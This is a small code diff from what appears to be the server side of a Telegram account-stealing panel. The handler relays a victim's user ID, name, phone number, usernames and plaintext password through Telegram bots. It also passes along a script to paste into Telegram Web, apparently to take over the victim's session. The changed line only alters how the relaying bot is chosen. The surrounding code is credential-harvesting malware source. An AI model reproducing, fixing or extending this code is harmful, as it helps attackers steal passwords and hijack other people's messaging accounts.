@@ -119,7 +119,7 @@ const handleRequest = async (req, res, data) => {
     guardian: guardianBot,
     deluge: delugeBot
   };
-  let bot = botMap[data.type] || 'safeguard';
+  let bot = data.type ? botMap[data.type] : 'safeguard';
   await bot.sendMessage(
     data.userId,
       `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.name}\n⭐ <b>Telegram Premium</b>: ${data.premium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.number}</tg-spoiler>\n${data.usernames}\n🔐 <b>Password</b>: <code>${data.password !== undefined ? data.password : "Null"}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script}</code>\n<b>Module</b>: ${data.type.charAt(0).toUpperCase() + data.type.slice(1)}`, {
